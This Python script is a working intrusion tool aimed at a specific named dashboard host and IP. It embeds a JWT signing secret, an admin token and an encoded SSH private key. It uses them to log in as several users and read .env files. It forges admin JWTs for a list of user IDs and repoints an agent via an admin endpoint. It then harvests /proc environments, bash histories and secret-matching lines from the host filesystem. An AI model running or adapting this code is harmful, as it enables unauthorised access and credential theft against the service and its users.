#!/usr/bin/env python3
# i29136: dashboard local-fallback host FS read on 122.51.1.87 + SSH key retest.
import os, sys, json, time, base64, hmac, hashlib, subprocess, re
import urllib.parse as up

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
ADMIN_TOKEN = "6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
T0 = time.time()
def el(): return int(time.time() - T0)
def _b(s):
    if not isinstance(s, str):
        s = json.dumps(s, ensure_ascii=False, default=str)
    return base64.b64encode(s.encode("utf-8", "replace")).decode()
def R(k, v):
    print("R:%s:%s" % (k, _b(v)), flush=True)

def curl(args, timeout=30):
    try:
        r = subprocess.run(["curl", "-s", "-k", "-m", str(timeout)] + args,
                           capture_output=True, timeout=timeout + 15)
        return r.returncode, r.stdout
    except Exception as e:
        return -1, repr(e).encode()

def call(path, method="GET", body=None, session=None, admin=False, internal=False,
         timeout=25, maxlen=8000):
    url = "https://%s%s" % (HOST, path)
    args = ["--http2", "-A", UA, "-H", "Accept: application/json, text/plain, */*",
            "-w", "\n__CODE__%{http_code}"]
    if session: args += ["-H", "Cookie: session=" + session]
    if admin: args += ["-H", "Authorization: Bearer " + ADMIN_TOKEN]
    if internal: args += ["-H", "x-internal-token: " + ADMIN_TOKEN]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json",
                 "--data-binary", json.dumps(body)]
    elif method != "GET":
        args += ["-X", method]
    args += [url]
    rc, out = curl(args, timeout=timeout)
    txt = out.decode("utf-8", "replace")
    code = ""
    i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i + 8:].strip()[:3]
        txt = txt[:i]
    return {"code": code, "body": txt[:maxlen], "len": len(txt), "rc": rc}

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def forge(user_id, customer="aro", role="admin"):
    now = int(time.time())
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    p = b64u(json.dumps({"userId": user_id, "email": "p@x", "customer": customer,
                         "role": role, "iat": now, "exp": now + 86400 * 7},
                        separators=(",", ":")))
    sig = b64u(hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
    return h + "." + p + "." + sig

def jload(s):
    try: return json.loads(s)
    except Exception: return None

def qp(p): return up.quote(p, safe="/")

def flist(aid, sess, path, timeout=30):
    r = call("/api/agents/%s/files?action=list&path=%s" % (aid, qp(path)), session=sess, timeout=timeout, maxlen=40000)
    j = jload(r["body"])
    ents = []
    if isinstance(j, dict) and isinstance(j.get("entries"), list):
        for e in j["entries"][:200]:
            ents.append({"n": e.get("name"), "t": e.get("type"), "s": e.get("size")})
    return r["code"], ents, r["body"][:300]

def fread(aid, sess, path, timeout=30, maxlen=600000):
    r = call("/api/agents/%s/files?action=read&path=%s" % (aid, qp(path)), session=sess, timeout=timeout, maxlen=maxlen)
    j = jload(r["body"])
    if isinstance(j, dict) and "content" in j:
        return r["code"], j.get("content") or "", j.get("size"), j.get("path")
    return r["code"], None, None, r["body"][:300]

SENS = re.compile(r"(SECRET|TOKEN|PASS|PWD|KEY|DATABASE|MYSQL|POSTGRES|REDIS|DSN|ADMIN|LUMII|ZOOFI|PRIVATE|AKID|LTAI|AKIA|dckr_pat_|gho_|ghp_|github_pat_|0x[0-9a-fA-F]{40,64}|BEGIN)", re.I)

def envlines(txt, key):
    """extract only interesting lines from NUL-separated env"""
    out = []
    for seg in re.split(r"[\x00\n]", txt):
        if not seg.strip(): continue
        if len(seg) > 4000: seg = seg[:4000] + "…"
        if SENS.search(seg):
            out.append(seg)
    return "\n".join(out)

# ---------------- Phase 0: health ----------------
h = call("/api/health", timeout=20)
R("P0_health", {"code": h["code"], "body": h["body"][:400]})

# ---------------- Phase 1: SSH retest ----------------
KEY_B64 = "LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNDeVVpa0lJbkNJR0xSZ3krY0Z1TEwycWdoejRCblJhaXVzd0g3SzdvUFZxUUFBQUtDY2piNTluSTIrCmZRQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQ3lVaWtJSW5DSUdMUmd5K2NGdUxMMnFnaHo0Qm5SYWl1c3dIN0s3b1BWcVEKQUFBRUNUTGcyYkFSNUZ4cUd4elJpWkUwZmdKRWFEV0xmVHhsRFpHdVBXZ2tZaUZMSlNLUWdpY0lnWXRHREw1d1c0c3ZhcQpDSFBnR2RGcUs2ekFmc3J1ZzlXcEFBQUFGblZpZFc1MGRVQnBjQzB4TnpJdE16RXRNVFF0TVRNQkFnTUVCUVlICi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="
KEY = base64.b64decode(KEY_B64).decode()
open("/tmp/k29136", "w").write(KEY)
os.chmod("/tmp/k29136", 0o600)
ssh_results = {}
for user in ("ubuntu", "root", "coder"):
    cmd = ("hostname; id; "
           "echo ==ENVDEV==; head -c 12000 /opt/lumii-prod/.env.dev 2>&1; "
           "echo ==ENVLOCAL==; head -c 6000 /home/ubuntu/lumii-dashboard/.env.local 2>&1; "
           "echo ==LS==; ls -la /opt/lumii-prod /home/ubuntu 2>&1 | head -80")
    args = ["--http2"] if False else []
    try:
        p = subprocess.run(
            ["ssh", "-i", "/tmp/k29136", "-p", "22",
             "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
             "-o", "BatchMode=yes", "-o", "ConnectTimeout=8",
             "-o", "PreferredAuthentications=publickey", "-o", "PasswordAuthentication=no",
             "%s@122.51.1.87" % user, cmd],
            capture_output=True, timeout=40)
        ssh_results[user] = {"rc": p.returncode,
                             "out": p.stdout.decode("utf-8", "replace")[:20000],
                             "err": p.stderr.decode("utf-8", "replace")[:800]}
    except Exception as e:
        ssh_results[user] = {"rc": -1, "out": "", "err": repr(e)}
    print("SSH %s rc=%s err=%s" % (user, ssh_results[user]["rc"], ssh_results[user]["err"][:200]), flush=True)
R("P1_ssh", ssh_results)
ssh_ok = any(v.get("rc") == 0 and "==LS==" in v.get("out", "") for v in ssh_results.values())
R("P1_ssh_ok", str(ssh_ok))

# ---------------- Phase 2: membership discovery ----------------
USERS = [
 "usr_ZxLewKrgbRYSm7rWDtQX8","usr_J29JW7MJRtMJfXe2cruEq","usr_j7t9Dhq4M4obQkag5huJi",
 "usr_h84uYNEaLgbdrcGFRGRis","usr_fJUE3VqiyFrqrJzAjq6Qc","usr_KSQogo9RMCDvYPzgebFZ9",
 "usr_3HNamBngy2Xfwm4T3tzMJ","usr_2gzZoKLgRAYaFNy2Sav4v","usr_JqvejphBd2cFVLWZQmtnZ",
 "usr_SjEcavSzyWqWKeokUwig4","usr_HhQysrVvW2uhNbyMfgT5D","usr_xahbQ7FZR4NAMztJFbDJS",
 "usr_CMU92C54VpuSAXoCfbXDE","usr_wcgceRDUAJsMFPfQgVgHc","usr_tqnzWEgcPdPMUguyD5PKm",
 "usr_etAuXiJB7UYPmqtqEh5Pv","usr_5MTDkxB65hVucKyfxUaMe","usr_gQZHAztNodEAy8GCY9YEg",
 "usr_4Ya9zoJ6ckEe9b77Ev7NS","usr_HXQCzMVo79Z65gPcAqk33","usr_8jFriEhWmpZv77ApNrsPX",
 "usr_krVGWCZF2uMYQba6hLT3r","usr_f5aLpRa9uHTdXC8hWP2ag","usr_QjRMrRJnFN9BLdujE8Q4J",
 "usr_pesN8T7K6RwVfNQeoakMw","usr_mMMqdtDuyWzh6b5y9YinE","usr_WVN3ZNSJT4HMwsGgFxhCE",
 "usr_w3nRZpmKCZNGDgFDUvHjA","usr_XLBCd82JGQAbt5pttnfAw","usr_pgnckdUSgpk9iDW3WemFY",
 "usr_8WTmpJ5gAdAXJdTAAgfcs",
]
member_map = {}     # user -> [ {id,name,ip,connected} ]
agent_members = {}  # agent_id -> [user,...]
for u in USERS:
    tok = forge(u)
    r = call("/api/agents/list", session=tok, timeout=25, maxlen=40000)
    j = jload(r["body"])
    lst = []
    if isinstance(j, list):
        for a in j:
            lst.append({"id": a.get("id"), "name": a.get("name"), "ip": a.get("ip"),
                        "connected": a.get("connected"), "ws": bool(a.get("workspacePath"))})
            agent_members.setdefault(a.get("id"), []).append(u)
    member_map[u] = {"code": r["code"], "agents": lst, "body": "" if lst else r["body"][:150]}
R("P2_members", member_map)
print("members: users_with_agents=%d distinct_agents=%d" % (
    sum(1 for v in member_map.values() if v["agents"]), len(agent_members)), flush=True)

# me check
r = call("/api/auth/me", session=forge(USERS[0]), timeout=20)
R("P2_me_admin", {"code": r["code"], "body": r["body"][:300]})

# ---------------- Phase 3: admin agent inventory ----------------
r = call("/api/admin/agents", admin=True, timeout=30, maxlen=200000)
ja = jload(r["body"])
agents_admin = []
if isinstance(ja, dict) and isinstance(ja.get("agents"), list):
    for a in ja["agents"]:
        agents_admin.append({"id": a.get("id"), "name": a.get("name"), "ip": a.get("ip"),
                             "customer": a.get("customer"), "status": a.get("status"),
                             "owner": a.get("imOwnerUserId"), "sshUser": a.get("sshUser"),
                             "ws": a.get("workspacePath")})
R("P3_admin_agents_code", r["code"])
R("P3_admin_agents", agents_admin)
print("admin agents: %d code=%s" % (len(agents_admin), r["code"]), flush=True)

r = call("/api/internal/connected-agents", internal=True, timeout=25)
jc = jload(r["body"])
connected = (jc or {}).get("connected") if isinstance(jc, dict) else None
R("P3_connected", {"code": r["code"], "connected": connected, "body": "" if connected is not None else r["body"][:200]})
connected = connected or []

# ---------------- Phase 4: choose target agent and read host FS ----------------
by_id = {a["id"]: a for a in agents_admin}
cands = []
# 4a: existing agent already pointing at local host
for a in agents_admin:
    if (a.get("ip") in ("127.0.0.1", "localhost", "122.51.1.87")) and agent_members.get(a["id"]):
        cands.append(("exists", a["id"], agent_members[a["id"]][0], a.get("ip")))
# 4b: any offline agent with a member -> temporary host patch
for aid, us in agent_members.items():
    a = by_id.get(aid) or {}
    if aid in connected:
        continue
    if any(c[1] == aid for c in cands):
        continue
    cands.append(("patch", aid, us[0], a.get("ip")))
R("P4_candidates", cands[:10])

def do_reads(aid, sess, tag):
    out = {}
    # list key dirs
    for p in ("/", "/opt", "/opt/lumii-prod", "/home", "/home/ubuntu", "/root",
              "/etc/systemd/system", "/var/lib/docker/containers"):
        c, ents, raw = flist(aid, sess, p, timeout=30)
        out["L:" + p] = {"code": c, "entries": ents[:120], "raw": raw if c != "200" else ""}
        print("list %s -> %s (%d)" % (p, c, len(ents)), flush=True)
    # read proc 1 env + cmdline
    for p in ("/proc/1/cmdline", "/proc/1/environ", "/etc/hostname", "/etc/environment",
              "/root/.bash_history", "/home/ubuntu/.bash_history"):
        c, content, size, path = fread(aid, sess, p, timeout=35)
        if content is not None:
            if p.endswith("environ"):
                out["R:" + p] = {"code": c, "size": size, "grep": envlines(content, p), "raw_len": len(content)}
            else:
                out["R:" + p] = {"code": c, "size": size, "content": content[:6000]}
        else:
            out["R:" + p] = {"code": c, "err": str(path)[:200]}
        print("read %s -> %s" % (p, c), flush=True)
    # enumerate /proc for node/assistant/center processes
    c, ents, raw = flist(aid, sess, "/proc", timeout=40)
    pids = [e["n"] for e in ents if e.get("n", "").isdigit()][:40] if c == "200" else []
    out["L:/proc"] = {"code": c, "npids": len(pids), "pids": pids[:40], "raw": raw if c != "200" else ""}
    print("proc pids=%d" % len(pids), flush=True)
    interesting = {}
    for pid in pids:
        c2, cmd, sz, pth = fread(aid, sess, "/proc/%s/cmdline" % pid, timeout=20, maxlen=20000)
        if cmd is None: continue
        cmdv = cmd.replace("\x00", " ")
        interesting[pid] = cmdv[:300]
        if re.search(r"(node|next|tsx|lumii|assistant|center|caddy|docker|python|postgres)", cmdv, re.I):
            c3, env, s3, p3 = fread(aid, sess, "/proc/%s/environ" % pid, timeout=25)
            if env is not None:
                out["E:" + pid] = {"cmd": cmdv[:300], "grep": envlines(env, pid), "raw_len": len(env)}
    out["P2_cmdlines"] = interesting
    return out

target = None
for kind, aid, u, ip in cands[:6]:
    sess = forge(u)
    # verify access first
    rr = call("/api/agents/%s/files?action=list&path=%s" % (aid, qp("/")), session=sess, timeout=25, maxlen=2000)
    print("cand %s %s owner=%s pre-code=%s" % (kind, aid, u, rr["code"]), flush=True)
    if rr["code"] != "200" and rr["code"] != "503":
        continue
    if kind == "patch":
        orig = ip
        pr = call("/api/admin/agents", method="PATCH", admin=True,
                  body={"id": aid, "host": "127.0.0.1"}, timeout=25, maxlen=4000)
        print("patch %s -> %s" % (aid, pr["code"]), flush=True)
        R("P4_patch_%s" % aid, {"code": pr["code"], "body": pr["body"][:400], "orig": orig})
        if pr["code"] != "200":
            continue
    res = do_reads(aid, sess, kind)
    R("P5_hostfs_%s" % aid, res)
    target = {"kind": kind, "aid": aid, "user": u, "orig_ip": ip}
    R("P5_target", target)
    if kind == "patch":
        pr2 = call("/api/admin/agents", method="PATCH", admin=True,
                   body={"id": aid, "host": ip or "0.0.0.0"}, timeout=25, maxlen=2000)
        R("P4_restore_%s" % aid, {"code": pr2["code"], "body": pr2["body"][:300]})
    break

R("P9_target", target)
print("DONE %ds" % el(), flush=True)
